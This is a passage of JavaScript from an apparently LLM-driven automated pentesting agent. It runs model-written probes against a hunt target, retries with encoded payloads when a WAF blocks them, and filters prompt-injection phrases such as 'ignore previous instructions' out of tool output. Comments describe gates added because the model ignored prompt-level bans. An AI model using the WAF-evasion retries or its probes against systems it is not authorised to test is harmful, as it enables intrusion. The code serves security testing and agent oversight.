      } catch { /* once-per-hunt record is best-effort */ }
    }
  } catch { /* variant sweep is best-effort */ }

  if (!plans.length) {
    // HUMAN-LIKE FALLBACK: The model thinks like a human ("Test: ...", "What if...",
    // "I wonder...") but doesn't always produce JSON. Extract test INTENTIONS from
    // the natural language thinking and construct executable commands.
    // A human assistant would do this: hear the idea, figure out how to test it.
    const extracted = extractTestsFromThinking(reply, recon, target);
    if (extracted.length) {
      think(huntId, `Extracted ${extracted.length} test(s) from natural thinking — executing.`);
      plans = extracted;
    } else {
      think(huntId, 'Model replied but produced no usable plan — skipping to next.');
      return { aiOk: false, best: null, failKind: 'bad_output' };
    }
  }

  // HYPOTHESIS LEDGER ENFORCEMENT (19 Oct 2026, solver #128 — XBOW playbook):
  // the ledger's DEAD set was a HARD ban list that lived only in the planning
  // prompt. Live evidence (h_bench_d69e5746, 14:23–14:35 UTC, first 14 min after
  // the 8a061b4 deploy): the model re-planned ledger-retired premises 7x —
  // "NoSQL injection on login" 4x (retired 14:15:03 after 19 failures, zero
  // verifications) and "SQLi authentication bypass on login" 3x (verified,
  // closed for same-instance re-test) — and the re-verifications kept minting
  // (+5 verified:true in ~4 min). Prompt-level steering is advisory; the 8B
  // demonstrably does not obey a ban list it helped retire. The chain-injector
  // needed the same treatment (8a061b4) — extend the same execution-level gate
  // to model-authored plans: drop any plan whose hypothesis the ledger
  // retired, with a think() audit line. Machine-generated probes (detId:
  // deterministic probes, variant sweep) are EXEMPT — they test premises the
  // ledger never retired, by construction. Verified hypotheses are NOT
  // filtered: same-instance re-tests stay prompt-banned, class variants stay
  // legitimate, and the sweep covers them deterministically. Validators,
  // gates, and assessResult untouched — this only stops dead premises from
  // reaching executeWithEvasion.
  try {
    const deadKeys = new Set(getHypothesisLedger(huntId).dead.map((d) => normalizeHypothesis(d.text)));
    // VERIFIED-INSTANCE ENFORCEMENT (19 Oct 2026, elite-gap cycle): the prompt
    // ban does not bind the 8B — "SQLi authentication bypass on login"
    // re-verified 3x in the 14 min AFTER the e5ef526 ledger deployed, and
    // 64 of 71 verified:true were that same bug. Each re-proof burns 1 of 3
    // execution slots per 10–15-min iteration — the exact budget class #3
    // discovery needs. Drop model-authored plans that re-test an
    // already-verified (hypothesis, test) pair, with a think() audit line.
    // detId-exempt (sweep/deterministic probes keep testing class variants
    // on sibling endpoints); chain-pursuit untouched (different test
    // strings); first-time verifications untouched (no pair recorded yet).
    // Validators, gates, and assessResult untouched — PoC re-verification
    // (generatePoC) runs outside the plans pipeline and is unaffected.
    const vPairs = getVerifiedPairs(huntId);
    // DEAD-END REGISTRY (Job 6 stage 4): validator rejections of the same
    // test, counted by code. At RETRY_BUDGET the instance is ruled out —
    // the forced pivot is logged, not suggested.
    const ruledCounts = getRuledOutCounts(huntId);
    if (deadKeys.size || vPairs.size || ruledCounts.size) {
      const kept = plans.filter((p) => {
        if (p.detId) return true; // machine-generated deterministic/sweep probe — exempt
        if (deadKeys.has(normalizeHypothesis(p.hypothesis))) {
          think(huntId, `Plan SKIPPED (ledger-retired premise): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        const ruled = ruledCounts.get(normalizeHypothesis(p.test || p.action || '')) || 0;
        if (ruled >= RETRY_BUDGET) {
          think(huntId, `Plan SKIPPED (dead-end registry: ${ruled} validator rejections — forced pivot): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        const pair = normalizeHypothesis(p.hypothesis) + '||' + normalizeHypothesis(p.test || p.action || '');
        if (vPairs.has(pair)) {
          think(huntId, `Plan SKIPPED (ledger-verified same-instance re-test): ${p.test || p.hypothesis || 'unnamed'}`);
          return false;
        }
        return true;
      });
      plans = kept;
    }
  } catch { /* ledger enforcement is best-effort — never break the hunt */ }

  // Execute up to 3 hypotheses (multi-hypothesis > single guess)
  let best = null;
  // PARALLEL EXECUTION: run all tests concurrently like a human would.
  // A human fires multiple probes at once, not one-by-one.
  // Execute up to 3 hypotheses (multi-hypothesis > single guess).
  // The model is asked for THREE plans; take up to 3 with commands.
  const testPromises = plans.slice(0, 3).filter((plan) => plan.command).map(async (plan) => {
    think(huntId, `Test: ${plan.test || 'unnamed'} — ${plan.why || ''}`);
    // TRANSPORT CAP (solver #459): was slice(0, 500), which cut legitimate
    // commands mid-string (a 650-char probe died on a dash syntax error,
    // #126). 4000 chars is a sanity bound for a single shell line, NOT a
    // validator; anything longer belongs in a file artifact executed by
    // path (WRITE_ARTIFACT / RUN_ARTIFACT), which is unbounded.
    const result = await executeWithEvasion(huntId, target, String(plan.command).slice(0, 4000));
    const rec = await assessResult(huntId, target, plan, result);
    // PLAN TREE (Job 6 stage 6): code records the validator outcome on
    // the leaf — verified closes it, failures count toward the park
    // threshold and the phase's re-plan trigger.
    try {
      recordPlanOutcome(huntId, plan.test || plan.hypothesis || '', rec ? (rec.verified ? 'verified' : 'rejected') : 'no-assessment');
    } catch { /* plan tree is best-effort */ }
    // Memory: record WHY this was tried and what was learned, so the agent
    // learns from its own reasoning across iterations (read back via
    // formatReasoningForPrompt in the planning prompt).
    try {
      recordReasoning(huntId, {
        hypothesis: plan.hypothesis || '',
        action: plan.test || 'unnamed',
        why: plan.why || '',
        result: rec ? (rec.verified ? 'VERIFIED: ' + (rec.title || rec.class || '') : 'not verified') : 'no assessment',
        learned: rec && rec.verified ? 'This attack works here — explore variants.' : 'This probe did not confirm a vulnerability here.',
        followUp: plan.hypothesis ? 'Consider variants of: ' + plan.hypothesis : '',
      });
    } catch { /* memory is best-effort, never break the hunt */ }
    // GLOBAL MEMORY (19 Oct 2026): record genuine technique failures so
    // future hunts deprioritise what consistently fails. Only clean
    // executions count — a malformed command (DNS failure, syntax error)
    // or an empty response teaches nothing about the technique itself,
    // and unidentifiable probes ('other') would pollute the counters.
    try {
      const rawOut = String((result && result.stdout) || '') + '\n' + String((result && result.stderr) || '');
      const malformed = /name or service not known|command not found|syntax error|no such file|invalid option|could not resolve/i.test(rawOut);
      const tech = inferTechnique(`${plan.test || ''} ${plan.hypothesis || ''}`);
      if (!malformed && rawOut.length > 50 && tech !== 'other' && rec && !rec.verified) {
        const gm0 = readHuntMeta(huntId) || {};
        const fp0 = gm0.appFingerprint || { appType: 'unknown', techStack: [] };
        recordGlobalLearning({
          type: 'technique',
          technique: tech,
          target: String(target).slice(0, 120),
          appType: fp0.appType || 'unknown',
          techStack: fp0.techStack || [],
          success: false,
          payload: String(plan.command || '').slice(0, 200),
          context: plan.test || 'unnamed probe',
          note: 'Technique executed cleanly but did not verify.',
        });
      }
      // PROBE QUALITY (19 Oct 2026, solver #121): malformed executions are a
      // SEPARATE failure signal from technique failures. A DNS failure teaches
      // nothing about whether the technique works against the app — but "your
      // last N probes never reached the target" is a lesson the model must see
      // compound. Kept apart (type 'probe-quality', own dedup key) so genuine
      // technique success rates stay clean. This is the dominant failure mode
      // for business-logic probes (fake domains, bare hostnames); the static
      // seed note was ignored, a compounding counter is harder to ignore.
      if (malformed && tech !== 'other') {
        const gm0q = readHuntMeta(huntId) || {};
        const fp0q = gm0q.appFingerprint || { appType: 'unknown', techStack: [] };
        recordGlobalLearning({
          type: 'probe-quality',
          technique: tech,
          target: String(target).slice(0, 120),
          appType: fp0q.appType || 'unknown',
          techStack: fp0q.techStack || [],
          success: false,
          payload: String(plan.command || '').slice(0, 200),
          context: plan.test || 'unnamed probe',
          note: 'Malformed probe — DNS failure, syntax error, or fake domain. The command never reached the target; this says nothing about the technique, only about command construction. Ground every URL to recon-discovered endpoints.',
        });
      }
    } catch { /* global memory is best-effort, never break the hunt */ }
    return rec;
  });
  const results = await Promise.all(testPromises);
  for (const rec of results) {
    if (rec && rec.verified && !best) best = rec;
  }
  return { aiOk: true, best };
}

/**
 * Execute a test with adaptive evasion: if blocked (403/WAF), retry with
 * encoders from the matrix before giving up.
 */
async function executeWithEvasion(huntId, target, command) {
  // PLACEHOLDER SUBSTITUTION (19 Oct 2026, elite-gap; extended same-cycle):
  // The 8B model sometimes echoes literal placeholders into commands instead
  // of the concrete target URL. First observed: "nmap -sV [target] | grep -q
  // 'price manipulation'" → "Error resolving [target]: Name or service not
  // known" (fixed 2d95530 for [target]/<target>/{target}). Then observed live:
  // "curl -s 'http://target/basket' | grep -E 'price:...'" → bare word
  // "target" used as a URL hostname, which the bracket-only fix did not catch
  // (probe failed on DNS). Later the model used NEW placeholder words for the
  // same purpose: bare "app" as hostname ("curl -X POST 'http://app/endpoint'")
  // and hallucinated fake domains ("https://app.com/product/low-priced",
  // "https://target-url.com/api/v1/products") — all DNS failures, all meant
  // the hunt target (solver #115, 19 Oct 2026). Deterministically resolve ALL
  // known placeholder spellings against the authorised hunt target BEFORE
  // execution. Scheme-aware hostname substitution runs FIRST so
  // "http://[target]/x" becomes "http://<real-host>/x" (not "http://http://...").
  // A model-supplied port is kept and applied to the bare hostname (avoids
  // doubling the port). The hostname pattern only matches the placeholder as
  // the FULL URL hostname (never inside paths or longer words like
  // "myapp.local"), and fake-domain replacement covers only the two domains
  // the model has actually hallucinated — real external domains are untouched.
  // This changes nothing about validation — output still goes through
  // evidenceGate and the 4-step verification — it only ensures the command
  // addresses the real target instead of a non-existent literal string.
  {
    let targetHost = String(target), targetHostname = String(target);
    try {
      const u = new URL(String(target));
      targetHost = u.host;         // e.g. 172.17.0.1:3000 (hostname + port)
      targetHostname = u.hostname;  // e.g. 172.17.0.1 (no port)
    } catch { /* target isn't a parseable URL — fall back to the raw string */ }
    const before = String(command);
    command = before
      // 19 Oct 2026 (solver #165): capture + conditionally re-emit the bracket
      // groups. The old callback dropped a consumed closing quote, so a
      // well-grounded quoted probe like url = 'http://TARGET' became
      // url = 'http://172.17.0.1:3000 (unterminated → SyntaxError, quarantined
      // as a false positive — finding #116). Now: a trailing quote is kept
      // only when the placeholder had NO opening bracket of its own (the
      // model's own shell quoting). Symmetric placeholder brackets
      // (http://[target]/x, 'http://<target>/y') are still dropped, keeping
      // the documented http://[target]/x → http://<real-host>/x behaviour.
      .replace(/(https?:\/\/)([[<{"'$]?)(?:target|app)([\]>\"'}]?)((?::\d+)?)(?=[/?#:;\s]|$)/gi,
        (m, scheme, open, close, port) => scheme + (port ? targetHostname : targetHost) + port + (open ? '' : close))
      .replace(/(https?:\/\/)app\.com((?::\d+)?)(?=[/?#:;\s]|$)/gi,
        (m, scheme, port) => scheme + (port ? targetHostname : targetHost) + port)
      .replace(/(https?:\/\/)target-url\.com((?::\d+)?)(?=[/?#:;\s]|$)/gi,
        (m, scheme, port) => scheme + (port ? targetHostname : targetHost) + port)
      .replace(/\[target\]/gi, target)
      .replace(/<target>/gi, target)
      .replace(/\$\{target\}/gi, target)
      .replace(/\{target\}/gi, target)
      .replace(/\$target\b/gi, target);
    if (command !== before) {
      think(huntId, 'Replaced a literal target placeholder with the real target before executing (model wrote a placeholder).');
    }
  }
  // Person capability: web search mid-hunt. If the model doesn't know
  // something, it can ask via "SEARCH: <query>" instead of guessing.
  const searchMatch = /^\s*SEARCH:\s*(.+)/i.exec(command);
  if (searchMatch) {
    const query = searchMatch[1].slice(0, 200);
    think(huntId, `Searching the web: ${query}`);
    try {
      const results = await webSearch(query, 5);
      const text = results.length === 0
        ? 'No web results found.'
        : results.map((r, i) => `${i + 1}. ${r.title}\n   ${r.url}`).join('\n');
      // ACI (stage 7): bounded envelope + explicit empty marker.
      return { stdout: summarizeToolOutput(text).text, stderr: '', exitCode: 0 };
    } catch {
      return { stdout: 'Web search failed.', stderr: '', exitCode: 1 };
    }
  }
  // Person capability (20 Oct 2026, solver #443): RECALL — on-demand
  // retrieval from his own notebook. SEARCH asks the web; RECALL asks his
  // past: this hunt's events + reasoning and the global-memory store.
  // Matches return as the command result AND are stashed on the hunt meta
  // so the next planning prompt carries them in a RECALLED MEMORY section.
  const recallMatch = /^\s*RECALL:\s*(.+)/i.exec(command);
  if (recallMatch) {
    const query = recallMatch[1].slice(0, 200);
    think(huntId, `Recalling: ${query}`);
    try {
      const rec = searchRecall({
        events: readHuntEvents(huntId),
        reasoningRows: getAllReasoning(huntId),
        globalMemories: readAllGlobalMemories(),
        query,
        limit: 8,
      });
      // Job 6 stage 2: RECALL routes through the SAME hybrid retrieval as
      // the automatic prompt slice (episode ledger, code-scored). Its hits
      // lead the reply; the reasoning/global-memory matches follow. If the
      // ledger is unavailable the original recall text stands alone.
      let ledgerText = '';
      let ledgerHits = 0;
      try {
        if (episodeLedgerEnabled()) {
          const ret = await retrieveEpisodes(query, { huntId, crossHunt: true, limit: 6 });
          ledgerHits = ret.results.length;
          if (ledgerHits) {
            ledgerText = formatRetrievalForPrompt(ret.results, { budgetChars: 2500, query });
          }
        }
      } catch { /* ledger recall is best-effort */ }
      const merged = ledgerText ? `${ledgerText}\n\n${rec.text}` : rec.text;
      // ACI (stage 7): the model reads back a bounded envelope, never a raw dump.
      const text = summarizeToolOutput(merged, { maxChars: 4000 }).text;
      appendHuntEvent(huntId, { type: 'recall', query, hits: rec.hits, ledgerHits });
      try {
        const m = readHuntMeta(huntId) || {};
        writeHuntMeta(huntId, { ...m, huntId, recallSection: { query, text: text.slice(0, 3000), at: new Date().toISOString() } });
      } catch { /* stash is best-effort */ }
      return { stdout: text, stderr: '', exitCode: 0 };
    } catch {
      return { stdout: 'Recall failed.', stderr: '', exitCode: 1 };
    }
  }
  // Person capability (Job 6 stage 5): PROPOSE_PLAYBOOK — the agent
  // proposes a playbook rule. Proposals are inert data; the promotion
  // gate in playbook.js makes a rule live ONLY after a validator-
  // confirmed success matches it. No success, no promotion — ever.
  const proposeMatch = /^\s*PROPOSE_PLAYBOOK:\s*(.+)/i.exec(command);
  if (proposeMatch) {
    const rule = proposeMatch[1].slice(0, 240);
    try {
      const id = proposePlaybook({ huntId, rule });
      appendHuntEvent(huntId, { type: 'playbook_proposal', proposalId: id, rule });
      think(huntId, `Playbook proposal recorded (${id || 'rejected'}): ${rule.slice(0, 100)}`);
      return {
        stdout: id
          ? 'Proposal recorded. It becomes a permanent playbook rule only after a validator-confirmed success matches it.'
          : 'Proposal rejected (empty rule).',
        stderr: '',
        exitCode: 0,
      };
    } catch {
      return { stdout: 'Proposal failed to record.', stderr: '', exitCode: 1 };
    }
  }
  // Person capability (solver #459): FILE ARTIFACTS — WRITE_ARTIFACT /
  // APPEND_ARTIFACT / READ_ARTIFACT / RUN_ARTIFACT. Long scripts and notes
  // live as files in the hunt workspace (unbounded, permanent); the prompt
  // only ever carries the handle. See artifacts.js for the grammar.
  try {
    const artifactResult = await handleArtifactCommand(huntId, command);
    if (artifactResult) return artifactResult;
  } catch { /* artifact layer must never break normal execution */ }

  // OUTPUT SPILL (solver #459): a large tool output is preserved IN FULL
  // as an artifact and the handle is noted in the hunt stream, so the
  // agent can READ_ARTIFACT any slice later. The result object itself is
  // returned untouched — the verifier keeps consuming the raw output
  // exactly as before.
  const maybeSpill = (r) => {
    try {
      const combined = `${r.stdout || ''}\n${r.stderr || ''}`;
      if (combined.length > 4000) {
        const name = spillOutput(huntId, combined);
        think(huntId, `Large tool output (${combined.length} chars) saved in full as artifact ${name} — READ_ARTIFACT: ${name} <start>:<end> reads any slice of it.`);
      }
    } catch { /* spill is best-effort */ }
    return r;
  };

  let result = await execInHuntContainer(huntId, command, 180000, { bypassTmux: true });
  const blocked = /403|406|406 Not Acceptable|blocked by|waf|forbidden/i.test(result.stdout + result.stderr)
    && result.stdout.length < 500;

  if (blocked) {
    think(huntId, 'Blocked (WAF/filter?) — trying encoded variants.');
    // Extract the payload-ish part and try encoders
    for (const enc of ['url', 'double_url', 'js_unicode']) {
      const encoded = encodePayload(command, enc);
      if (encoded === command) continue;
      const retry = await execInHuntContainer(huntId, encoded.slice(0, 500), 60000, { bypassTmux: true });
      if (retry.stdout.length > result.stdout.length * 1.5) {
        think(huntId, `Evasion worked with ${enc} encoding.`);
        return maybeSpill(retry);
      }
    }
  }
  return maybeSpill(result);
}

/** Extract the key "interesting signal" from output for reproducibility comparison. */
function extractSignal(output) {
  const t = output.toLowerCase();
  const signals = [];
  if (/sql syntax|mysql|postgres|sqlite|ora-\d+|sql error/i.test(t)) signals.push('sql-error');
  if (/stack trace|traceback|exception in|at .*\(.*\.js:/i.test(t)) signals.push('stack-trace');
  if (/root:|uid=0|uid=\d+\(/i.test(t)) signals.push('cmd-exec');
  if (/<script>alert|onerror=|onload=/i.test(t)) signals.push('xss-reflect');
  if (/admin|administrator|dashboard/i.test(t)) signals.push('admin-exposure');
  if (/\.env|secret|private key|api[_-]?key/i.test(t)) signals.push('secret-exposure');
  if (/directory listing|index of\//i.test(t)) signals.push('dir-listing');
  if (/bypass|403.*200|unauthorized.*authorized/i.test(t)) signals.push('auth-bypass');
  return signals.sort().join(',');
}

/**
 * FIX #175: Sanitize tool output before feeding to AI.
 * Prevents prompt injection from malicious targets.
 * Removes/neutralizes common injection patterns.
 */
function sanitizeForAI(text) {
  if (!text) return '';
  let clean = String(text);
  // Remove common prompt injection patterns
  const injectionPatterns = [
    /ignore\s+(all\s+)?previous\s+instructions/gi,
    /disregard\s+(all\s+)?previous/gi,
    /you\s+are\s+now\s+a/gi,
    /new\s+instructions:/gi,
    /system\s*:\s*/gi,
    /\[system\]/gi,
    /<\|.*?\|>/g, // Special tokens
  ];
  for (const pattern of injectionPatterns) {
    clean = clean.replace(pattern, '[FILTERED]');
  }
  // Limit length and remove excessive newlines
  clean = clean.slice(0, 3000).replace(/\n{4,}/g, '\n\n\n');
  return clean;
}

/**
 * FIX (19 Oct 2026, solver #6): Strip terminal artifacts from tool output.
 * Container exec output includes Kali MOTD banner, shell prompts, and ANSI
 * codes (from tmux capture-pane or shell startup). These contaminate:
 * 1. Recon endpoints — MOTD lines like '┗━(Run: "touch ~/.hushlogin"...)' were
 *    added as "endpoints"; the /login/ filter matched "hushlogin" so mandatory
 *    SQLi tests ran against garbage URLs.
 * 2. Finding evidence — evidence.response contained MOTD+prompt instead of the
 *    HTTP body, so payload_validation could never match the payload.
 * This strips terminal chrome but preserves the actual command output.
 */
function stripTerminalArtifacts(text) {
  if (!text) return '';
  let clean = String(text);
  // Remove ANSI escape codes (colors, cursor movement)
  clean = clean.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '');
  clean = clean.replace(/\x1b\][^\x07]*\x07/g, ''); // OSC sequences
  // Remove Kali MOTD banner lines and shell prompts, line by line
  const lines = clean.split('\n');
  const filtered = lines.filter((line) => {
    const t = line.trim();
    if (!t) return true; // keep empty lines (structure)
    // Kali MOTD banner markers
    if (/Message from Kali developers/i.test(t)) return false;
    if (/minimal installation of Kali/i.test(t)) return false;
    if (/touch ~\/\.hushlogin/i.test(t)) return false;
    if (/troubleshooting\/common-minimum-setup/i.test(t)) return false;
    // Pure box-drawing lines (MOTD borders)
    if (/^[┏━┃┗┌└─│\s]+$/.test(t) && /[┏━┃┗┌└]/.test(t)) return false;
    // MOTD content lines (start with ┃ box-drawing char)
    if (/^[┃│]/.test(t)) return false;
    // Shell prompt lines: ┌──(root㉿host)-[dir] and └─# command echo
    if (/┌──\(.*\)-\[.*\]/.test(t)) return false;
    if (/^└─#/.test(t)) return false;
    // Classic prompt patterns (just in case)
    if (/^root@[a-zA-Z0-9-]+:[^#]*#\s*$/.test(t)) return false;
    return true;
  });
  return filtered.join('\n');
}

/** Assess a test result: weirdness check → evidence gate → verify. */
/**
 * VALIDATOR AS A STEP (Job 6 stage 7, XBOW pattern): every assessResult
 * verdict — including the silent discards (execution failure, not
 * interesting, evidence-gate rejection) that used to leave no trace —
 * becomes a first-class 'validation' episode in the hunt stream, so the
 * ledger can answer "how often did the validator speak, and what did it
 * say?" for any hunt.
 */
function recordValidation(huntId, plan, verdict, detail = '') {
  try {
    appendHuntEvent(huntId, {
      type: 'validation',
      verdict,
      plan: (plan && plan.test) || '',
      detail: String(detail || '').slice(0, 300),
      text: `validation: ${(plan && plan.test) || 'unnamed'} — ${verdict}`,
    });
  } catch { /* audit is best-effort */ }
}

/**
 * CONTENT-RELEVANCE BASELINES (solver #454, Job 7 item C): the target's
 * generic response bodies — its root page and a canary path that returns
 * the SPA fallback / generic error — fetched through the hunt container
 * with the same exec path the probes use, normalised exactly like
 * assessResult output, cached per hunt for 10 minutes. The relevance
 * judgement (hunt-intel/differential.js) compares a candidate's
 * signal-bearing text against these bodies: signal words that are part
 * of the site's ambient content cannot prove a vulnerability.
 * Returns null when no baseline could be fetched (the judgement then
 * abstains on the novelty limb rather than blocking blind).
 */
const baselineCache = new Map(); // huntId -> { at, texts }
async function getTargetBaselines(huntId, target) {
  const hit = baselineCache.get(huntId);
  if (hit && Date.now() - hit.at < 10 * 60 * 1000) return hit.texts;
  try {
    const base = String(target || '').replace(/\/+$/, '');
    if (!base) return null;
    const cmd = `curl -sk -m 15 ${JSON.stringify(base + '/')}; printf '\n==DM-CANARY==\n'; curl -sk -m 15 ${JSON.stringify(base + '/dm-baseline-canary-7f3a')}`;
    const res = await execInHuntContainer(huntId, cmd, 60000, { bypassTmux: true });
    const raw = String((res && res.stdout) || '');
    if (executionFailed(res, raw + '\n' + String((res && res.stderr) || '')) || !raw.trim()) return null;
    const texts = raw.split('==DM-CANARY==')
      .map((p) => stripTerminalArtifacts(sanitizeForAI(p)).slice(0, 20000))
      .filter((t) => t.trim().length > 0);
    if (!texts.length) return null;
    // Corpus extension (solver #456, Job 8 item 3): the root HTML shell is
    // not the whole ambient surface — its linked CSS/JS assets are generic
    // target content too, and asset-shaped stamps (#233/#256 family) must
    // be judged against the real asset bodies. Same-origin only (the
    // extractor enforces it), bounded count + per-asset bytes. Any failure
    // here falls back to the shell-only corpus — never worse than before.
    try {
      const assetUrls = extractLinkedAssetUrls(texts[0], base + '/');
      if (assetUrls.length) {
        const acmd = assetUrls
          .map((u) => `curl -sk -m 10 ${JSON.stringify(u)} | head -c 262144`)
          .join("; printf '\\n==DM-ASSET==\\n'; ");
        const ares = await execInHuntContainer(huntId, acmd, 90000, { bypassTmux: true });
        const araw = String((ares && ares.stdout) || '');
        if (araw.trim() && !executionFailed(ares, araw + '\n' + String((ares && ares.stderr) || ''))) {
          for (const part of araw.split('==DM-ASSET==')) {
            const t = stripTerminalArtifacts(sanitizeForAI(part)).slice(0, 20000);
            if (t.trim().length > 0) texts.push(t);
          }
        }
      }
    } catch { /* asset corpus is best-effort; shell corpus still applies */ }
    baselineCache.set(huntId, { at: Date.now(), texts });
    return texts;
  } catch {
    return null;
  }
}

async function assessResult(huntId, target, plan, result) {
  // FIX (19 Oct 2026, solver #6): Strip terminal artifacts (Kali MOTD, shell
  // prompts, ANSI codes) from tool output BEFORE using it as evidence.
  // Contaminated output caused payload_validation to fail on genuine findings.
  const output = stripTerminalArtifacts(sanitizeForAI(result.stdout + '\n' + result.stderr)).slice(0, 3000);

  // Weirdness check: investigate even without signature match
  const weird = scoreWeirdness(
    { status: result.code === 0 ? 200 : 500, bodyLength: output.length, timeMs: 1000, body: output },
    { status: 200, bodyLength: 2000, timeMs: 500 }
  );
  if (isWorthInvestigating({ status: 200, bodyLength: output.length, timeMs: 1000, body: output }, { status: 200, bodyLength: 2000, timeMs: 500 })) {
    think(huntId, `Weird response (score ${weird.score}): ${weird.signals.join(', ')} — investigating.`);
    // CURIOSITY: a human hunter doesn't shrug at anomalies — they poke harder.
    // Ask the brain for one targeted follow-up probe into this weirdness.
    try {
      const followUp = await chatWithAI(
        [{ role: 'user', text: `Something odd happened during a security test. Follow your curiosity — propose ONE follow-up probe to dig into this anomaly.\n\nOriginal test: ${plan.test}\nCommand: ${String(plan.command).slice(0, 300)}\nOdd signals: ${weird.signals.join(', ')}\nResponse excerpt: ${output.slice(0, 1200)}\n\nReply as JSON: {"test":"name","command":"shell command","why":"one line"}. Non-destructive, target-scoped.` }],
        'You are a curious elite bug-bounty hunter. Output ONLY the requested JSON, no prose.',
        { huntId }
      );
      const fm = /\{[\s\S]*\}/.exec(followUp || '');
      const fp = fm ? JSON.parse(fm[0]) : null;
      if (fp && fp.command) {
        think(huntId, `Curiosity follow-up: ${fp.test || 'probing deeper'} — ${fp.why || ''}`);
        const fres = await executeWithEvasion(huntId, target, String(fp.command).slice(0, 4000));
        // FIX (19 Oct 2026, solver #6): Strip terminal artifacts so evidence is clean.
        const frecout = stripTerminalArtifacts(fres.stdout + '\n' + fres.stderr).slice(0, 3000);
        // If the follow-up confirms something interesting, treat it as a candidate
        if (/vulnerable|exposed|bypass|injection|leak|admin|secret|token|password|error.*sql|stack trace/i.test(frecout) && frecout.trim().length > 50) {
          // FIX (19 Oct 2026): include impact_demo — evidenceGate requires it
          // for critical findings and nothing ever set it (see above).
          const fsigs = extractSignal(frecout);
          const fcand = { class: 'agent_finding', title: `Curiosity find: ${fp.test}`, severity: inferSeverity(fp.test || '', frecout), url: target, evidence: { request: fp.command, response: frecout.slice(0, 800), impact_demo: `Impact signals [${fsigs || 'none'}]: ${frecout.slice(0, 400)}` } };
          const { pass } = evidenceGate(fcand);
          if (pass) {
            appendHuntEvent(huntId, { type: 'finding', ...fcand, verified: false, via: 'curiosity' });
            think(huntId, `Curiosity paid off — queued for verification: ${fp.test}`);
          }
        }
      }
    } catch { /* curiosity must never break the hunt */ }
  }

/** Infer severity from the test name and output — not everything is medium. */
function inferSeverity(testName, output) {
  const t = (testName + ' ' + output).toLowerCase();
  if (/rce|remote code execution|sql injection|sqli|auth bypass|authentication bypass|ssrf|server-side request forgery|arbitrary file|path traversal.*write|command injection/i.test(t)) return 'critical';
  if (/xss|cross-site scripting|ssti|idor|open redirect|csrf|xxe|file inclusion|lfi|rfi|jwt/i.test(t)) return 'high';
  if (/info disclosure|information disclosure|verbose error|stack trace|directory listing|cors|clickjacking|missing header/i.test(t)) return 'low';
  return 'medium';
}

  // FIX (20 Oct 2026, solver #442): EXECUTION-FAILURE GATE — the root cause
  // of the verifier false-accept family (45 settled cases). When the probe
  // command failed in the container, `output` here is the exec layer's error
  // echo ("Command failed: docker exec … sh -c <cmd>"), which CONTAINS the
  // probe URL — so the 'admin'/'secret' interesting-test and extractSignal
  // matched the failure echo itself, and the verification re-run reproduced
  // the same deterministic failure and called it confirmation. A failed
  // execution is not evidence: discard before any finding is built.
  if (executionFailed(result, output)) {
    think(huntId, `Execution failed (exit ${result && result.code}) — error output is not evidence; discarding this result.`);
    // DEAD-END REGISTRY (Job 6 stage 4): repeated execution failures of
    // the same probe are a deterministic signal too — after the retry
    // budget the plan filter rules the probe out instead of letting the
    // model burn iterations re-issuing a broken command form.
    try {
      recordRuledOut({
        huntId,
        title: plan.test || 'unnamed probe',
        family: 'execution-failed',
        detail: `exit ${result && result.code}`,
        linkEpisode: false,
      });
    } catch { /* registry is best-effort */ }
    recordValidation(huntId, plan, 'execution-failed', `exit ${result && result.code}`);
    return null;
  }

  const interesting = weird.score >= 40 || /vulnerable|exposed|bypass|injection|leak|admin|secret|token|password|error.*sql|stack trace/i.test(output);
  if (!interesting || output.trim().length < 50) {
    recordValidation(huntId, plan, 'not-interesting', output.trim() ? 'no signal in output' : 'empty output');
    return null;
  }

  // FIX (19 Oct 2026): evidenceGate requires impact_demo for critical-severity
  // findings, but nothing ever set it — so EVERY critical finding (including a
  // working SQLi auth bypass, classified critical by inferSeverity) was silently
  // discarded at the gate and could never verify. The signal-bearing response
  // excerpt IS the impact demonstration.
  const sigs = extractSignal(output);
  const cand = {
    class: 'agent_finding',
    title: plan.test || 'agent-discovered anomaly',
    severity: inferSeverity(plan.test || '', output),
    url: target,
    evidence: {
      request: plan.command,
      response: output.slice(0, 800),
      impact_demo: `Impact signals [${sigs || 'none'}]: ${output.slice(0, 400)}`,
    },
  };
  const { pass, gated } = evidenceGate(cand);
  if (!pass) {
    recordValidation(huntId, plan, 'gate-rejected', 'evidence gate rejected the candidate');
    return null;
  }

  // REAL VERIFICATION (not hardcoded): re-run the exact test to confirm
  // reproducibility. A one-off anomaly is not a vulnerability.
  let confirmed = false;
  try {
    think(huntId, `Verifying: re-running the test to confirm reproducibility…`);
    const retry = await execInHuntContainer(huntId, String(plan.command).slice(0, 500), 120000, { bypassTmux: true });
    const confirmOutput = (retry.stdout + '\n' + retry.stderr).slice(0, 3000);
    // Confirmation: second run shows the same interesting signals.
    // FIX (solver #442): the re-run must also have EXECUTED — a reproduced
    // failure yields the same echo-derived signal and is not confirmation.
    const sig1 = extractSignal(output);
    const sig2 = extractSignal(confirmOutput);
    confirmed = !executionFailed(retry, confirmOutput) && sig1.length > 0 && sig1 === sig2;
    if (confirmed) {
      think(huntId, `Verified: reproducible finding (${sig1}).`);
    } else {
      think(huntId, `Not confirmed: second run differed — treating as one-off anomaly.`);
    }
  } catch (err) {
    think(huntId, `Verification re-run failed: ${err.message || err}`);
  }

  // FIX (19 Oct 2026, solver #3): impact_assessment rejected GENUINE findings.
  // Proven by simulation with the real pipeline code: a working SQLi auth
  // bypass (admin JWT in a clean 200 JSON) scores weird=8 and contains none
  // of the literal words vulnerable/bypass/injection/leak — so a real
  // vulnerability was verdict as "false_positive (impact_assessment)".
  // extractSignal's impact signals (admin-exposure, auth-bypass, sql-error…)
  // ARE the impact demonstration — honour them here.
  const v = verifyPipeline({
    reachability: output.length > 50,
    payload_validation: /vulnerable|exposed|bypass|injection|leak|admin|secret|token|password|error.*sql|stack trace/i.test(output),
    impact_assessment: weird.score >= 40 || sigs.length > 0 || /vulnerable|bypass|injection|leak/i.test(output),
    exploit_confirmation: confirmed,
  });
  // CONTENT-RELEVANCE JUDGEMENT (20 Oct 2026, solver #454 — the residual
  // left by the #442 execution gate): a SUCCESSFUL command can still
  // return irrelevant-but-signal-bearing content — the target's own SPA
  // fallback (signal words are ambient site content), a different host's
  // response, or output that negates the claim ("not exposed: …/.env").
  // A would-be verified finding must also be BOUND to its claim:
  // on-target host, a non-negated supporting signal, and signal text
